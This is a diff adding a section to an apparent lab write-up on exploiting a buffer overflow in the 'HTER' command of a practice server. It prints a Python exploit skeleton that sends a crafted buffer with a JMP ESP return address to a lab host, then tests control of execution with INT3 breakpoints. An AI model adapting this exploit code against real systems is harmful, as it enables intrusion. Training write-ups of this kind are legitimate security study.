@@ -86,6 +86,37 @@ When we overflow the buffer, we see that we control `EIP` and `ESP` so basically
 
 ![](/assets/images/CTP/hterJMP.JPG)
 
+I went with the address at `0x625011BB`, but since our application is interpreting input as hex, we have to format it as `BB115062` in our payload since we also have to remember to format it for Little Endian. So, 1. reverse order and 2. no `\x` needed. 
+
+Our payload now looks like this: 
+```python
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+
+host = "192.168.1.201"
+port = 9999
+
+buffer = 'A' * <offset number :)>
+buffer += 'BB115062'
+buffer += 'C' * (3000 - len(buffer))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+s.send("HTER " + buffer)
+print s.recv(1024)
+s.close()
+```
+
+## Shellcode and Endgame
+
+Next we just have to generate some shellcode and add our NOPs and we should be good to go. But first, let's test and make sure our exploit worked. A cool thing about the program interpreting our characters as hex is that our `C` buffer will be interpreted as pairs of `CC` which is the opcode for `INT3` which will effectively become a breakpoint for us since it's an interrupt. Pretty cool way to see if our `JMP ESP` worked as intended. If it did, we should see `EIP` pointing to the top of a stack of `INT3` opcodes. 
+
+![](/assets/images/CTP/INT3.JPG)
+
 
 ## Resources
 
